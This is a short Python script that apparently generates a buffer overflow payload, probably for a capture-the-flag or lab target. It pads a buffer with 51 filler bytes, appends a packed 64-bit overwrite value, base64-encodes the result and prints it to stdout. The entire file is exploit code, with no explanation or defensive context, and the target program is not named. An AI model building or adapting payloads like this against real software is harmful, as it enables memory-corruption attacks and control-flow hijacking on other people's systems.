
import sys
import struct
import base64

buf = b'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'
buf += struct.pack('<Q', 10914965968748098329)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
